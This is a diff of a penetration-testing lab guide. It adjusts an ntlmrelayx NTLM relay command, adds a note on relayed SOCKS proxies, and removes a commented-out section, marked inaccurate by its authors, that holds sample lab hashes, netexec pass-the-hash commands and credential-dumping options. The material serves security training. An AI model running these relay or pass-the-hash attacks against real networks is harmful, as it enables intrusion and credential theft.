@@ -355,7 +355,7 @@ Remember how we did this manually with Nmap during the NetExec Lab and then used
 The command below invokes **`impacket-ntlmrelayx`**, a tool from the Impacket suite designed for NTLM relay attacks. These attacks exploit the NTLM authentication protocol to relay credential authentication requests to other network services. The tool is highly configurable, allowing for various attack scenarios. 
 
 ```bash
-sudo /home/telchar/.local/bin/ntlmrelayx.py -tf ~/smb_relay.txt --delegate-access -ts -of /opt/work/relays --dump-laps -l /opt/work/loot -smb2support -c whoami -socks | tee -a smb-relay.log
+sudo ntlmrelayx.py -tf ~/smb_relay.txt --delegate-access -ts -of /opt/work/relays --dump-laps -l /opt/work/loot -smb2support -c whoami -socks | tee -a smb-relay.log
 ```
 
 
@@ -425,6 +425,9 @@ We can always go back and reread this output with the below command.
 less smb-relay.log
 ```
 
+???+ note "What these SOCKS proxies mean"
+    You now have authenticated SOCKS proxies to SRV02 as `eddard.stark` (with admin access) and `robb.stark`. These proxies let you tunnel other tools through the compromised host to reach systems that aren't directly accessible from The Forge. In the **Pivot and Escalate** lab, you'll see how to use harvested credentials to move laterally between systems using exactly this kind of access.
+
 ## Resetting The Board
 
 Responder logs and execution history can be found in `~/git-tools/Responder/`.
@@ -450,49 +453,3 @@ If you don't do this, the Lab *should* still work but the terminal won't *show* 
 Skipping Hash Output
 ///
 
-<!-- The following section is not accurate and needs close review. -->
-<!-- ## Optional: SMB Auth / Pass-the-Hash
-
-Now that we have some captured hashes, we can test SMB authentication by running the following command which will conduct a pass-the-hash style attack.
-
-???+ warning
-    Here are sample hashes captured with Responder within your Lab env.
-
-    ```
-    robb.stark::NORTH:1122334455667788:138B29A14C5A082F19F946BB3AFF537E:01010000000000000090C5E56494D801E5D2F5789054B95D0000000002000800480053003600340001001E00570049004E002D004C00420052004E0041004D0031005300540051005A0004003400570049004E002D004C00420052004E0041004D0031005300540051005A002E0048005300360034002E004C004F00430041004C000300140048005300360034002E004C004F00430041004C000500140048005300360034002E004C004F00430041004C00070008000090C5E56494D801060004000200000008003000300000000000000000000000003000002D4B5557B9EF589ECE5944B06785A55D686F279D120AC87BCBF6D0FEAA6663B90A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
-    eddard.stark::NORTH:1122334455667788:76E26250ABF96A09E68ADC5A9B1A4C29:01010000000000000090C5E56494D801CA05EDDA86BE30280000000002000800480053003600340001001E00570049004E002D004C00420052004E0041004D0031005300540051005A0004003400570049004E002D004C00420052004E0041004D0031005300540051005A002E0048005300360034002E004C004F00430041004C000300140048005300360034002E004C004F00430041004C000500140048005300360034002E004C004F00430041004C00070008000090C5E56494D801060004000200000008003000300000000000000000000000003000002D4B5557B9EF589ECE5944B06785A55D686F279D120AC87BCBF6D0FEAA6663B90A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
-    ```
-
-In the captured hashes above, the NTLM hash appears after the second colon (":") and before the second to last colon, which is this part: **`76E26250ABF96A09E68ADC5A9B1A4C29`** for the user `eddard.stark` and `138B29A14C5A082F19F946BB3AFF537E` for the `robb.stark` user.
-
-We can execute a pass-the-hash attack against SMB manually with the below `netexec` command.
-
-```bash
-netexec smb 192.168.56.22 -u eddard.stark -H '76E26250ABF96A09E68ADC5A9B1A4C29' --local-auth --shares
-```
-
-- **`-H 'HASH'`**: The **`H`** option is used to specify an NTLM hash for authentication instead of a plaintext password. This is useful in situations where you have obtained the NTLM hash of a user's password through other means. **`'HASH'`** should be replaced with the actual NTLM hash.
-- **`--local-auth`**: This flag indicates that local authentication should be used. This means the authentication attempt will be made assuming the provided credentials are for a local account on the target system, as opposed to a domain account.
-- `--shares`: An option to list or interact with the SMB shares on the target machine.
-
-![Ntlmrelayx socks command displaying active SOCKS proxy connections for relayed sessions](img/responder-socks-list.png){ width="70%" }
-
-You won’t get the same results with the `robb.stark` user’s command below because that user doesn’t have the rights to access and list out the different shares.
-
-```bash
-netexec smb 192.168.56.22 -u robb.stark -H '138B29A14C5A082F19F946BB3AFF537E' --local-auth
-```
-
-You can also check a whole subnet (maybe widespread admin account?).
-
-???+ warning
-    BE CAREFUL HERE, without the `--local-auth` flag, accounts will lock out
-
-```bash
-netexec smb 192.168.56.0/24 -u USERNAME -H 'HASH' --local-auth
-```
-
-You can further extend your attack by including additional optional. Like the ones below…
-
-- **`--sam`** and **`--lsa`** focus on extracting data from Windows security databases stored on disk.
-- **`--M lsassy`** extracts credentials directly from memory, offering a different approach that can sometimes yield more immediate results, including plaintext passwords. -->
